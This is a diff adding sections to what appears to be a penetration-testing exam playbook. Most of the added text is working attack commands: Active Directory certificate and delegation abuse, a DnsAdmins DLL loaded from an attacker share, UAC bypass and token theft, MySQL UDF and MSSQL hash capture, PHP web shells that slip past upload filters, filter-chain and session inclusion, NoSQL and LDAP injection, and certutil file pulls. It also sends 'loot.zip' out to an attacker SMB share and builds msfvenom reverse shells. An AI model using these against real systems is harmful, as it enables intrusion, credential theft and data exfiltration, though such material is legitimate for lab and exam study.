@@ -143,6 +143,11 @@ Pick one service with a real lead and open its task. An unidentified service ret
 - tftp_reported: TFTP was reported. TFTP-01 tests one filename. Next: TFTP-01.
 - rsync_reported: Rsync was reported. RSYNC-01 lists modules. Next: RSYNC-01.
 - ipmi_reported: IPMI was reported. IPMI-01 checks the BMC. Next: IPMI-01.
+- vnc_reported: VNC was reported. VNC-01 checks the desktop. Next: VNC-01.
+- ntp_reported: NTP was reported. NTP-01 checks the server. Next: NTP-01.
+- x11_reported: X11 was reported. X11-01 checks display access. Next: X11-01.
+- squid_reported: A proxy was reported. SQUID-01 tests it. Next: SQUID-01.
+- unfamiliar_service: No specific task fits. Follow GENERIC-01. Next: GENERIC-01.
 - rdp_reported: RDP was reported. RDP-01 checks the permitted account. Next: RDP-01.
 - product_bearing_service_selected: A non-web service carries a scanner-qualified product. One candidate review is justified. Next: EXP-01.
 - other_service: No task matches the service. Keep a specific gap. Next: GAP-SERVICE.
@@ -386,6 +391,8 @@ Keep the captured method, content type and every required field. JSON or multipa
 | Required account observed | **WEB-09**. |
 | POSIX argument, file read or SQL context | **WEXEC-01** / **WREAD-01** / **WSQL-01**. |
 | Anomaly | **GAP-WEB-INPUT**. |
+| JSON body | **WEB-26**. |
+| GraphQL or OAuth | **WEB-27**. |
 
 ## WEB-05. Check one observed hostname
 
@@ -441,6 +448,7 @@ Read the request in Network: file field, accepted type, required fields, returne
 | Result | Next |
 | --- | --- |
 | Delete action known | **WUPLOAD-01** with one inert marker. |
+| Extension or content-type gate | **WUPLOAD-03**. |
 | Existing template is edited, not uploaded | **WEDIT-01**. |
 | Identity or fields unclear | **WEB-09** / **WEB-08**. |
 | No delete or recovery path | **PAUSE-RECOVERY** before uploading. |
@@ -673,6 +681,9 @@ Mark only the successfully authenticated principal as Owned. An edge is a candid
 | LAPS / replication / RBCD / gMSA / GPO / object right | **AD-10** / **AD-11** / **AD-16** / **AD-17** / **AD-18** / **AD-19**. |
 | Certificate-service right or CA clue | **ADCS-01**. |
 | Delegation flag or writable SPN | **DELEG-01**. |
+| ADIDNS zone write | **ADIDNS-01**. |
+| `dnsAdmins` membership | **DNSADM-01**. |
+| `GenericWrite` on an account | **SHADOW-01**. |
 | Local admin or WinRM edge | **AD-13** / **AD-12**. |
 | No edge, other service lead | **NET-05**. |
 | Partial collection | **PAUSE-COVERAGE**. |
@@ -769,6 +780,8 @@ Match the hostname to the assigned target and read the actual token, not the use
 | Enabled `SeImpersonatePrivilege` | **WIN-08**. |
 | Enabled `SeRestorePrivilege` / `SeManageVolumePrivilege` | **WIN-09** / **WIN-11**. |
 | Enabled `SeBackupPrivilege` / `SeTakeOwnershipPrivilege` / `SeDebugPrivilege` | **WPRIV-02** / **WPRIV-03** / **WPRIV-04**. |
+| Enabled `SeLoadDriverPrivilege` / `SeCreateTokenPrivilege` / `SeTcbPrivilege` | **WPRIV-07** / **WPRIV-08**. |
+| Medium integrity while in Administrators | **WPRIV-09**. |
 | Loopback listener | **WIN-12**. |
 | Host or token unverified | **EXP-03**. |
 
@@ -812,6 +825,7 @@ Get-Item -LiteralPath '<PATH>' | Select-Object FullName, Length, LastWriteTimeUt
 | AlwaysInstallElevated clue | **WIN-07**. |
 | Token privilege | **WIN-08**, **WIN-09** or **WIN-11**. |
 | Credential material | **WIN-03**. |
+| DPAPI credential files | **WPRIV-10**. |
 | Writable startup path | **WPRIV-06**. |
 | Elevated token and task creation | **WPRIV-05**. |
 | Build candidate | **WIN-13**. |
@@ -1192,6 +1206,9 @@ Read the CA name, template names, enrolment rights and the reported ESC classes.
 | ESC4 writable template | **ADCS-05**. |
 | ESC7 CA officer gap | **ADCS-06**. |
 | ESC3 enrolment-agent template | **ADCS-07**. |
+| ESC2 Any-Purpose template | **ADCS-08**. |
+| ESC5 CA object control or ESC11 RPC relay | **ADCS-09**. |
+| ESC9/ESC10 weak mapping | **ADCS-10**. |
 | Nothing vulnerable | **AD-09** for another right. |
 | Find denied | **PAUSE-COVERAGE**. |
 
@@ -1294,6 +1311,52 @@ certipy-ad req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -templat
 
 Remove `agent.pfx` and the issued `.pfx` afterwards.
 
+## ADCS-08. Is an Any-Purpose template available (ESC2)?
+
+Enter when ADCS-01 flags ESC2 and you can enrol.
+
+```bash
+certipy-ad req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -template '<TEMPLATE>' -dc-ip '<DC_IP>'
+```
+
+An Any-Purpose certificate authenticates as you for any service. For another principal, ESC2 alone is not enough unless the template also allows a subject.
+
+| Result | Next |
+| --- | --- |
+| Certificate issued | **ADCS-03** for your own identity. |
+| Subject not allowed | Chain it with **ADCS-10**. |
+| Enrol denied | **ADCS-01**. |
+
+## ADCS-09. Is the CA object or RPC interface controllable (ESC5/ESC11)?
+
+ESC5 needs write rights on the CA object or its configuration. Check with the find output, then grant yourself officer:
+
+```bash
+certipy-ad ca -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -add-officer '<USERNAME>' -dc-ip '<DC_IP>'
+```
+
+ESC11 relays NTLM to the CA's RPC interface, so use **RELAY-02** with `-t 'http://<CA_HOST>'` or the RPC relay target from the reviewed tool.
+
+| Result | Next |
+| --- | --- |
+| Officer granted | **ADCS-06**. |
+| Only ESC11 reported | **RELAY-02** against the CA. |
+| Neither right | **ADCS-01**. |
+
+## ADCS-10. Is certificate mapping weak (ESC9/ESC10)?
+
+With strong mapping disabled, request a certificate carrying the target UPN, then authenticate with the target name:
+
+```bash
+certipy-ad req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -template '<TEMPLATE>' -upn 'administrator@<DOMAIN>' -dc-ip '<DC_IP>'
+certipy-ad auth -pfx administrator.pfx -username administrator -domain '<DOMAIN>' -dc-ip '<DC_IP>'
+```
+
+| Result | Next |
+| --- | --- |
+| Auth returns the target's TGT/hash | **AD-03** or **AD-13**. |
+| Mapping still strong | Use **ADCS-02** with a subject-enabled template. |
+| Auth fails | **PAUSE-COVERAGE**; check the UPN and CA name. |
 # ad_abuse
 
 Coercion, relay, delegation and domain trusts. Each task assumes a validated domain identity and an attributed target.
@@ -1377,6 +1440,7 @@ Bit 524288 is unconstrained; `msDS-AllowedToDelegateTo` is constrained.
 | --- | --- |
 | Unconstrained account you control or can use | **DELEG-03**. |
 | Constrained entry with an interesting SPN | **DELEG-02**. |
+| No protocol transition, but a service ticket is obtainable | **DELEG-04**. |
 | Only RBCD rights | **AD-16**. |
 
 ## DELEG-02. Can constrained delegation be abused?
@@ -1438,6 +1502,69 @@ impacket-getTGT '<TRUSTED_DOMAIN>/<USERNAME>:<PASSWORD>' -dc-ip '<TRUSTED_DC_IP>
 | Trust listed, identity invalid there | **PAUSE-COVERAGE**; a trust does not grant access. |
 | No trust | **AD-09** for a local right. |
 
+## ADIDNS-01. Can a DNS record be added?
+
+Enter with write rights over the AD-integrated zone.
+
+```bash
+python3 dnstool.py -u '<DOMAIN>\<USERNAME>' -p '<PASSWORD>' -r '<NAME>' -a add -t A -d '<KALI_IP>' '<DC_IP>'
+nslookup '<NAME>' '<DC_IP>'
+```
+
+| Result | Next |
+| --- | --- |
+| Record resolves to Kali | Point the service that trusts that name at you. |
+| Add denied | **GAP-ACCESS**. |
+| Existing record | Use `-a modify` once. |
+
+## DNSADM-01. Is the DNS service loading an arbitrary DLL?
+
+Enter with `dnsAdmins` membership and a copy of `dnscmd`.
+
+```cmd
+dnscmd <DC_HOST> /config /serverlevelplugindll \\<KALI_IP>\owb\evil.dll
+sc.exe \\<DC_HOST> stop dns
+sc.exe \\<DC_HOST> start dns
+nslookup <DC_HOST>
+```
+
+Serve the DLL from Kali with `impacket-smbserver owb . -smb2support`. The DLL runs as the DNS service.
+
+| Result | Next |
+| --- | --- |
+| Callback on `nslookup` | **WIN-01** via **EXP-03**. |
+| No callback | Check the UNC path and SMB access; **PAUSE-COVERAGE**. |
+| Config denied | **GAP-ACCESS**. |
+
+## SHADOW-01. Can shadow credentials be added?
+
+Enter with write rights on the target account (`GenericWrite`/`GenericAll`).
+
+```bash
+certipy-ad shadow auto -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -account '<TARGET_ACCOUNT>' -dc-ip '<DC_IP>'
+```
+
+| Result | Next |
+| --- | --- |
+| Key credential and auth material returned | **AD-03** on one host. |
+| Write denied | **AD-09**; the edge is wrong. |
+| Auth fails | **PAUSE-COVERAGE**. |
+
+## DELEG-04. Is delegation usable without protocol transition?
+
+Enter with constrained delegation but no `TRUSTED_TO_AUTH_FOR_DELEGATION`. You need a service ticket for the delegating account first:
+
+```bash
+impacket-getST -spn '<DELEGATING_SPN>' '<DOMAIN>/<SVC_ACCOUNT>:<PASSWORD>' -dc-ip '<DC_IP>'
+impacket-getST -spn '<TARGET_SPN>' -impersonate administrator -additional-ticket '<SERVICE_TICKET>' -dc-ip '<DC_IP>'
+KRB5CCNAME='administrator.ccache' impacket-psexec -k -no-pass '<DOMAIN>/administrator@<TARGET_HOST>'
+```
+
+| Result | Next |
+| --- | --- |
+| Target ticket issued | **WIN-01** in the shell. |
+| `KDC_ERR_BADOPTION` | Check the SPN pair and the delegating ticket. |
+| Ticket mismatch | **PAUSE-COVERAGE**. |
 # password_attacks
 
 Spray and crack one credential source at a time.
@@ -1820,6 +1947,84 @@ Another administrator must sign in for the file to run.
 
 Delete the file when done.
 
+## WPRIV-07. Is a reviewed driver loadable with SeLoadDriverPrivilege?
+
+Enter with the privilege, an elevated token and a reviewed vulnerable driver and loader.
+
+```cmd
+sc.exe create owbdrv type= kernel binPath= C:\Windows\Temp\driver.sys
+sc.exe start owbdrv
+sc.exe query owbdrv
+```
+
+Run the reviewed loader against the loaded driver, then remove it:
+
+```cmd
+sc.exe stop owbdrv
+sc.exe delete owbdrv
+```
+
+| Result | Next |
+| --- | --- |
+| Driver loads and the loader returns a token | **WIN-01** in that context. |
+| `sc` denies the load | Check integrity and path; **WIN-01**. |
+| Loader fails | **EXP-01** for the driver/loader pair. |
+
+## WPRIV-08. Are SeCreateToken or SeAssignPrimaryToken usable?
+
+Enter with either privilege and an existing high-value token.
+
+```cmd
+incognito.exe list_tokens -u
+incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe
+```
+
+`SeTcbPrivilege` alone is not enough to mint a token; use it with a reviewed token tool.
+
+| Result | Next |
+| --- | --- |
+| SYSTEM shell | **WIN-01**. |
+| Token listed but execute denied | Check the exact privilege; **PAUSE-COVERAGE**. |
+| No token listed | **WIN-02**. |
+
+## WPRIV-09. Is UAC standing between an admin token and elevation?
+
+```cmd
+whoami /groups | findstr /i "Label"
+```
+
+A Medium mandatory label while the account is in Administrators means filtered admin. Run a reviewed UACME build:
+
+```cmd
+Akagi64.exe 23 C:\Windows\System32\cmd.exe
+```
+
+| Result | Next |
+| --- | --- |
+| High-integrity shell | **WIN-01**. |
+| Still Medium | Try another method ID once; **PAUSE-COVERAGE**. |
+| Account is not admin | **WIN-02**. |
+
+## WPRIV-10. Can DPAPI credentials be decrypted?
+
+```cmd
+dir /a "%APPDATA%\Microsoft\Credentials"
+dir /a "%LOCALAPPDATA%\Microsoft\Credentials"
+```
+
+With the current user's context, parse one file with a reviewed tool:
+
+```cmd
+SharpDPAPI.exe credentials /target:%APPDATA%\Microsoft\Credentials\<FILE>
+```
+
+Mimikatz equivalent: `dpapi::cred /in:"<FILE>"`. A masterkey is needed for a different user.
+
+| Result | Next |
+| --- | --- |
+| Plaintext credential | **AD-03** or **WIN-10**. |
+| Blob needs another user's masterkey | Record the file; **GAP-ACCESS**. |
+| No files | **WIN-03**. |
 # dns_nfs
 
 Replace every `<...>` value before running its command.
@@ -2063,6 +2268,10 @@ Check `SHOW GRANTS` or `Ssl_cipher` only when the next decision needs them.
 | Result | Next |
 | --- | --- |
 | Relevant schema or rights | **NET-05** for the matching application. |
+| IMPERSONATE or linked-server right | **DB-09** / **DB-10**. |
+| `xp_dirtree` enabled | **DB-11**. |
+| FILE privilege and writable plugin directory | **DB-12**. |
+| Oracle listener with usable credentials | **DB-13**. |
 | PostgreSQL program or server-file right | **DB-07** / **DB-08**. |
 | Permission denied | **NET-05**. |
 | Server identity differs | **PAUSE-ROUTE**. |
@@ -2134,6 +2343,48 @@ Or decode the hex locally: `printf '%s' '<HEX>' | xxd -r -p | head -c 4096 | cat
 | Missing file | **PAUSE-COVERAGE**. |
 | Permission denied | **NET-05**. |
 
+## DB-12. Can MySQL load a UDF?
+
+Enter with `FILE` privilege and a writable plugin directory.
+
+```sql
+SHOW VARIABLES LIKE 'plugin_dir';
+SHOW VARIABLES LIKE 'secure_file_priv';
+SELECT @@version_compile_os;
+```
+
+Upload `lib_mysqludf_sys.so` (or the matching `.dll`) with:
+
+```sql
+SELECT 0x<HEX> INTO DUMPFILE '<PLUGIN_DIR>/lib_mysqludf_sys.so';
+CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';
+SELECT sys_exec('id > /tmp/owb');
+```
+
+| Result | Next |
+| --- | --- |
+| Function created and executes | **EXP-01** for a shell. |
+| `FUNCTION` error | Version/architecture mismatch; **PAUSE-COVERAGE**. |
+| No FILE privilege | **DB-02**. |
+
+Drop the function and file only after the shell exists.
+
+## DB-13. Can Oracle be attacked with ODAT? (optional)
+
+**Optional.** Safe to skip under exam time pressure.
+
+```bash
+odat all -s '<TARGET_IP>' -p 1521
+odat dbms -s '<TARGET_IP>' -p 1521
+```
+
+An exposed listener with default or weak credentials is the usual prerequisite.
+
+| Result | Next |
+| --- | --- |
+| Credentials or privileges found | **DB-06** for metadata, then ODAT modules. |
+| Listener only | **PAUSE-COVERAGE**. |
+| No ODAT | **DB-06**. |
 # mssql
 
 ## DB-03. Can the assigned SQL login connect to this verified SQL Server?
@@ -2185,6 +2436,62 @@ Restore reverse order afterwards (`xp_cmdshell` 0, then advanced options 0) and 
 | Windows account output | **EXP-01**; **WIN-01** only with a real shell. |
 | Denied or proxy missing | **PAUSE-COVERAGE** after restore. |
 | No trustworthy output | **PAUSE-RECOVERY** until restored. |
+
+## DB-09. Can this login impersonate a higher principal?
+
+```sql
+SELECT SUSER_SNAME(), IS_SRVROLEMEMBER('sysadmin');
+SELECT name FROM sys.server_permissions WHERE grantee_principal_id = SUSER_ID('<LOGIN>');
+EXECUTE AS LOGIN = 'sa';
+SELECT SUSER_SNAME(), IS_SRVROLEMEMBER('sysadmin');
+REVERT;
+```
+
+For database ownership, check `IS_MEMBER('db_owner')` and `EXECUTE AS USER = 'dbo'`, then `REVERT`.
+
+| Result | Next |
+| --- | --- |
+| Higher login or dbo context | **DB-04** for what it can read or execute. |
+| IMPERSONATE listed but denied | **PAUSE-COVERAGE**. |
+| No right | **DB-02** for another lead. |
+
+## DB-10. Are linked servers reachable?
+
+```sql
+EXEC sp_linkedservers;
+SELECT * FROM OPENQUERY([<LINKED_SERVER>], 'SELECT @@version');
+EXEC ('SELECT SYSTEM_USER') AT [<LINKED_SERVER>];
+```
+
+A linked server runs with its configured mapping, which may be a higher login.
+
+| Result | Next |
+| --- | --- |
+| Query returns | **DB-04** on the linked instance. |
+| `data access` disabled | Try `EXEC sp_serveroption '<LINK>','data access','true';` once. |
+| Login mapped differently | Record it; **PAUSE-COVERAGE**. |
+
+## DB-11. Can xp_dirtree or db_owner be used?
+
+Start a capture:
+
+```bash
+responder -I '<IFACE>' -A
+```
+
+```sql
+EXEC master.dbo.xp_dirtree '\\<KALI_IP>\owb', 1, 1;
+```
+
+A captured NetNTLMv2 hash goes to **PASS-02** or **RELAY-02**. For `db_owner`, use `EXECUTE AS USER='dbo'` and check whether `CREATE PROCEDURE` is allowed.
+
+| Result | Next |
+| --- | --- |
+| Hash captured | **PASS-02** / **RELAY-02**. |
+| `db_owner` confirmed | **DB-04** with the elevated context. |
+| `xp_dirtree` disabled | **PAUSE-COVERAGE**. |
+
+Stop Responder after the capture.
 
 # mail_rdp
 
@@ -2340,6 +2647,7 @@ rsync -av 'rsync://<TARGET_IP>/<MODULE>' ./rsync-copy/
 | --- | --- |
 | Module list | Read one module with `rsync -av`. |
 | Files retrieved | **ART-01** on a selected file. |
+| Windows target needs the same file | **XFER-03**. |
 
 Delete the local copy after triage.
 | Connection refused | **NET-03**. |
@@ -2406,6 +2714,83 @@ ipmitool -I lanplus -H '<TARGET_IP>' -U ADMIN -P ADMIN chassis status
 | Silent | **NET-04**. |
 
 Mode 7300 is IPMI2 RAKP HMAC-SHA1.
+
+
+## VNC-01. Is VNC exposed? (optional)
+
+**Optional.** Safe to skip under exam time pressure.
+
+```bash
+nmap -sV -p '<PORT>' --script vnc-info '<TARGET_IP>'
+vncviewer '<TARGET_IP>:<PORT>'
+```
+
+A stored password file can be decrypted offline with `vncpasswd.py -d <FILE>`.
+
+| Result | Next |
+| --- | --- |
+| Desktop opens | Host work at **WIN-01** or **LNX-01** after **EXP-03**. |
+| Password required | Try a recovered value once. |
+| Auth failure | **PAUSE-COVERAGE**. |
+
+
+
+## NTP-01. Is NTP answering? (optional)
+
+**Optional.** Safe to skip under exam time pressure.
+
+```bash
+ntpq -c peers '<TARGET_IP>'
+ntpdate -q '<TARGET_IP>'
+```
+
+Useful for a clock-skew issue with Kerberos, not usually a path by itself.
+
+| Result | Next |
+| --- | --- |
+| Server responds with peers | Record it; **AD-01** if Kerberos time fails. |
+| No response | **NET-04**. |
+
+
+
+## X11-01. Is an X server open? (optional)
+
+**Optional.** Safe to skip under exam time pressure.
+
+```bash
+nmap -sV -p 6000 --script x11-access '<TARGET_IP>'
+xdpyinfo -display '<TARGET_IP>:0'
+```
+
+| Result | Next |
+| --- | --- |
+| Access granted | Capture the screen with `xwd` or read the display. |
+| Access denied | **PAUSE-COVERAGE**. |
+
+## SQUID-01. Is Squid an open proxy?
+
+```bash
+curl -x 'http://<TARGET_IP>:3128' -sS -i 'http://127.0.0.1/'
+proxychains -f proxychains.conf curl -sS 'http://<INTERNAL_HOST>/'
+```
+
+| Result | Next |
+| --- | --- |
+| Internal content returned | **NET-05** on the internal host. |
+| Denied | **PAUSE-COVERAGE**. |
+
+## GENERIC-01. Unfamiliar service, what now?
+
+1. Read the banner and confirm the protocol at **NET-03**.
+2. Take the exact product and version.
+3. `searchsploit --disable-colour '<PRODUCT>' '<VERSION>'`, `searchsploit -m <EDB_ID>`.
+4. Read the header, then check each prerequisite at **EXP-01**.
+5. No source: look for default credentials, anonymous access or a management console at **WEB-04**.
+
+| Result | Next |
+| --- | --- |
+| Matching source and prerequisites | **EXP-02**. |
+| No source | **PAUSE-COVERAGE** with the exact product. |
 # web_input
 
 Start from the working request at WEB-06/08. Form stays POST: repeat every required field and a fresh CSRF value. For an existing session add `--header '@<HEADERS>'` only on the same origin.
@@ -2771,6 +3156,33 @@ For an image-only filename gate, send the same bytes with `type=image/jpeg`.
 
 Callback: `ncat --listen '<KALI_IP>' '<PORT>' --verbose`, then request `mode=callback`. In the shell: `hostname; id; pwd`. Verify with **EXP-03**, then **LNX-01**. Cleanup with `mode=cleanup` or the UI, then delete the exact local files.
 
+## WUPLOAD-03. Can the upload validation be bypassed?
+
+Try one gate at a time and keep the exact response:
+
+```bash
+# declared type only
+curl --form '<FIELD>=@shell.php;filename=shell.php;type=image/png' '<UPLOAD_URL>'
+# double extension
+curl --form '<FIELD>=@shell.php;filename=shell.php.jpg' '<UPLOAD_URL>'
+# magic bytes plus PHP
+printf 'GIF89a<?php system($_GET["c"]); ?>' > shell.gif.php
+curl --form '<FIELD>=@shell.gif.php;filename=shell.gif.php;type=image/gif' '<UPLOAD_URL>'
+```
+
+For Apache, an uploaded `.htaccess` can map an extension:
+
+```text
+AddType application/x-httpd-php .owb
+```
+
+| Result | Next |
+| --- | --- |
+| File executes | **EXP-01**. |
+| Upload accepted, no execution | Try one other gate; **PAUSE-COVERAGE**. |
+| Extension rejected | `.htaccess` route, then **WEB-08**. |
+
+Delete the uploaded file through the app afterwards. **Optional** when the plain upload already executes.
 # web_editor
 
 ## WEDIT-01. Can a template execute PHP and restore cleanly?
@@ -2951,6 +3363,8 @@ Freemarker: <#assign x="freemarker.template.utility.Execute"?new()>${x("id")}
 | `49` and `uid=` | **EXP-01** for a shell payload. |
 | `49` only | Try one engine payload, then **PAUSE-COVERAGE**. |
 | No evaluation | **WEB-06** for another field. |
+| Wrappers filtered | **WEB-24**.
+| Session ID and file storage | **WEB-25**. |
 
 ## WEB-21. Is there a deserialization sink?
 
@@ -3004,6 +3418,72 @@ curl -sS '<TARGET_URL>?<FIELD>=<img src=x onerror=fetch("//<KALI_IP>/?c="+docume
 | Payload reflected but inert | **PAUSE-COVERAGE**; note encoding. |
 | Callback with cookie | Replay the cookie at **WEB-09**. |
 
+## WEB-24. Can a filter chain read source without wrappers?
+
+```bash
+python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]);?>' > chain.txt
+curl -sS '<TARGET_URL>?<FIELD>='"$(cat chain.txt)"'&c=id'
+```
+
+| Result | Next |
+| --- | --- |
+| `uid=` output | **EXP-01**. |
+| Empty or error | **WEB-13**. |
+
+## WEB-25. Can a session file be included?
+
+Write PHP into a value the app stores in the session, read the `PHPSESSID`, then include the file:
+
+```bash
+curl -sS -b 'PHPSESSID=<SID>' '<TARGET_URL>?<FIELD>=<?php system($_GET["c"]);?>'
+curl -sS '<TARGET_URL>?<FIELD>=/var/lib/php/sessions/sess_<SID>&c=id'
+```
+
+Other paths: `/tmp/sess_<SID>`, `/var/lib/php5/sess_<SID>`.
+
+| Result | Next |
+| --- | --- |
+| `uid=` output | **EXP-01**. |
+| No output | **WEB-13** for the log path. |
+
+## WEB-26. Is it NoSQL or LDAP instead of SQL?
+
+NoSQL login bypass:
+
+```bash
+curl -sS -H 'Content-Type: application/json' --data '{"user":{"$ne":null},"pass":{"$ne":null}}' '<LOGIN_URL>'
+```
+
+LDAP filter injection:
+
+```text
+user=*)(uid=*))(|(uid=*
+user=admin*
+```
+
+| Result | Next |
+| --- | --- |
+| Authenticated or a larger result set | Record the operator; **WEB-09**. |
+| No change | **WEB-08** for the actual body format. |
+| Error reveals an engine | **PAUSE-COVERAGE**. |
+
+
+
+## WEB-27. Is the API GraphQL or OAuth? (optional)
+
+**Optional.** Safe to skip under exam time pressure.
+
+```bash
+curl -sS -H 'Content-Type: application/json' --data '{"query":"{__schema{types{name}}}"}' '<GRAPHQL_URL>'
+```
+
+OAuth: change `redirect_uri` to your host and watch for a code leak; check API version paths (`/v1/`, `/v2/`) for weaker auth.
+
+| Result | Next |
+| --- | --- |
+| Schema or code returned | Enumerate one interesting type or replay the code. |
+| Disabled introspection | **PAUSE-COVERAGE**. |
+| No GraphQL/OAuth | **WEB-01**. |
 # access
 
 Candidate review, attempt result and session attribution.
@@ -3031,6 +3511,8 @@ Compare the candidate with the exact product/version, the function you reached, 
 | One prerequisite missing | Answer it at **NET-03**, **WEB-03** or **LNX-01**. |
 | Unsupported artifact or no recovery | **GAP-ACCESS**. |
 | Candidate needs delivery to the target | **XFER-01**. |
+| A Metasploit module is the faster fit | **MSF-01**. |
+| No payload built yet | **PAY-01**. |
 | Route conflict | **PAUSE-ROUTE**. |
 
 ## EXP-02. What did one reviewed attempt actually produce?
@@ -3173,6 +3655,168 @@ sha256sum ./artifact.bin
 
 Keep the local copy at 0600 and delete it after use.
 
+## XFER-03. Can a file reach a Windows target?
+
+Serve one file from Kali:
+
+```bash
+python3 -m http.server '<PORT>' --bind '<KALI_IP>'
+```
+
+Any of these pulls it; use the one that exists:
+
+```cmd
+certutil -urlcache -split -f http://<KALI_IP>:<PORT>/payload.exe C:\Windows\Temp\payload.exe
+bitsadmin /transfer owb http://<KALI_IP>:<PORT>/payload.exe C:\Windows\Temp\payload.exe
+```
+
+```powershell
+Invoke-WebRequest 'http://<KALI_IP>:<PORT>/payload.exe' -OutFile 'C:\Windows\Temp\payload.exe'
+```
+
+SMB is the fallback when HTTP egress is blocked: `impacket-smbserver owb . -smb2support`, then `copy \\<KALI_IP>\owb\payload.exe C:\Windows\Temp\`.
+
+| Result | Next |
+| --- | --- |
+| File present, hash checked | Return to the task that needs it. |
+| HTTP blocked | Use SMB or base64 over the existing shell. |
+| Transfer partial | Delete it; **PAUSE-COVERAGE**. |
+| The target copy must come back | **XFER-04**. |
+
+Stop the server and delete both copies afterwards.
+
+## XFER-04. Can a file leave the Windows target?
+
+Use a writeable SMB share:
+
+```bash
+impacket-smbserver owb . -smb2support
+```
+
+```cmd
+copy C:\Windows\Temp\loot.zip \\<KALI_IP>\owb\loot.zip
+```
+
+Or an upload endpoint:
+
+```bash
+python3 -m uploadserver '<PORT>' --bind '<KALI_IP>'
+```
+
+```powershell
+Invoke-RestMethod -Method Post -Uri 'http://<KALI_IP>:<PORT>/upload' -Form @{ file = Get-Item 'C:\Windows\Temp\loot.zip' }
+```
+
+| Result | Next |
+| --- | --- |
+| File present on Kali, hash matches | **ART-01** if it needs triage. |
+| Copy denied | Try the other method once. |
+| Partial | **PAUSE-COVERAGE**. |
+
+Delete the target copy only after the Kali copy is verified.
+
+# metasploit
+
+MSF is allowed on one target per exam attempt. Use manual paths first and spend the allowance where a module saves real time.
+
+## MSF-01. Choose and review one module before use
+
+```text
+msfconsole -q
+search <PRODUCT> <VERSION>
+info <MODULE_NUMBER>
+```
+
+Read the module's rank, target, payload, required options and side effects. `check` when the module supports it.
+
+| Result | Next |
+| --- | --- |
+| Module and target match the service | **MSF-02**. |
+| Prerequisites differ | **EXP-01** with the manual path. |
+| No module | **EXP-01**. |
+
+## MSF-02. Configure one attempt
+
+```text
+use <MODULE_NUMBER>
+set RHOSTS <TARGET_IP>
+set RPORT <PORT>
+set LHOST <KALI_IP>
+set LPORT <LPORT>
+show options
+run
+```
+
+Set only options with no default; review the payload, target index and architecture. Keep a separate manual listener if the module is staged.
+
+| Result | Next |
+| --- | --- |
+| Session opens | **MSF-03**. |
+| Error before dispatch | Correct only the named option, rerun once. |
+| No session | **EXP-02** with the raw output. |
+
+## MSF-03. Use, route and clean up a session
+
+```text
+sessions -l
+sessions -i <SESSION_ID>
+```
+
+Inside meterpreter: `getuid`, `sysinfo`, `background`, then back in the console:
+
+```text
+route add <INTERNAL_SUBNET> <SESSION_ID>
+portfwd add -l <LOCAL_PORT> -p <REMOTE_PORT> -r <INTERNAL_HOST>
+```
+
+`route` sends MSF modules through the session; `portfwd` exposes one TCP port. Neither is a system proxy.
+
+| Result | Next |
+| --- | --- |
+| Host and identity match | **EXP-03**, then **WIN-01** or **LNX-01**. |
+| Wrong host/identity | **EXP-03**. |
+| No session or route | **PAUSE-COVERAGE**. |
+
+Cleanup: remove forwards and routes (`portfwd delete`, `route remove`), kill the session, exit the console. Delete any module output you staged.
+
+# payloads
+
+## PAY-01. Reverse or bind?
+
+Reverse when the target can reach your interface; confirm first:
+
+```bash
+nc -lvnp '<LPORT>'
+```
+
+Bind when egress is blocked: the target listens, and you reach it through a tunnel.
+
+| Result | Next |
+| --- | --- |
+| Callback arrives | Reverse payload. |
+| No callback but bind port accepts internally | Bind payload plus **PIVOT-01**. |
+| Neither | **PAUSE-COVERAGE**; check the route. |
+| Direction chosen | **PAY-02**. |
+
+## PAY-02. Generate and check one payload
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST='<KALI_IP>' LPORT='<LPORT>' -f exe -o payload.exe
+msfvenom -p linux/x64/shell_reverse_tcp LHOST='<KALI_IP>' LPORT='<LPORT>' -f elf -o payload.elf
+msfvenom -p java/jsp_shell_reverse_tcp LHOST='<KALI_IP>' LPORT='<LPORT>' -f war -o payload.war
+file payload.exe
+sha256sum payload.exe
+```
+
+Staged payloads contain `/` (`windows/x64/shell/reverse_tcp`) and need a handler; stageless payloads do not. Match the target architecture, not your CPU.
+
+| Result | Next |
+| --- | --- |
+| Format and architecture match | Stage with **XFER-01** or **XFER-03**. |
+| Wrong arch or format | Regenerate once. |
+| AV blocks it | Encode or change format; mark optional. |
+
+Listener hygiene: one foreground listener, `ncat --listen`, `rlwrap` when interactive, and stop it with Ctrl-C after the session.
 # pivoting
 
 Reach one internal service through a host you already control.
@@ -3713,7 +4357,7 @@ until startup behavior has been reviewed.
 
 | Result                                                                                                                                                     | Next action                                                                                                                                                                                     |
 | ---------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Exact prerequisite matches an authored LPRIV procedure, including an observed root-SUID PHP CLI with `pcntl_exec` or the exact GNU tar wildcard conditions | Open only the matching **LPRIV-01 through LPRIV-15** decision. Its own entry, permission, proof and cleanup checks still apply; no generic exploit-source detour or full LPRIV sweep is needed. |
+| Exact prerequisite matches an authored LPRIV procedure, including an observed root-SUID PHP CLI with `pcntl_exec` or the exact GNU tar wildcard conditions | Open only the matching **LPRIV-01 through LPRIV-20** decision. Its own entry, permission, proof and cleanup checks still apply; no generic exploit-source detour or full LPRIV sweep is needed. |
 | Exact right, consumer identity, trigger and reviewed procedure supported                                                                                   | **EXP-01**, then one **EXP-02** attempt with its restoration plan. This task does not invent a binary-specific exploitation recipe.                                                             |
 | Permission available but consumer/trigger/behavior missing                                                                                                 | Return to **LNX-03**, **LNX-04** or **LNX-06** for the exact missing fact.                                                                                                                      |
 | Version/build/configuration mismatch                                                                                                                       | **LNX-10**, switch to a supported lead; do not assume an unpatched kernel from version text.                                                                                                    |
@@ -5311,6 +5955,18 @@ CA officer rights can enable and issue a template.
 
 The agent certificate requests a cert for another principal.
 
+## ADCS-08. What decides this step?
+
+Any-Purpose authenticates you to any service, not another user.
+
+## ADCS-09. What decides this step?
+
+CA object or RPC control reaches officer rights or relay.
+
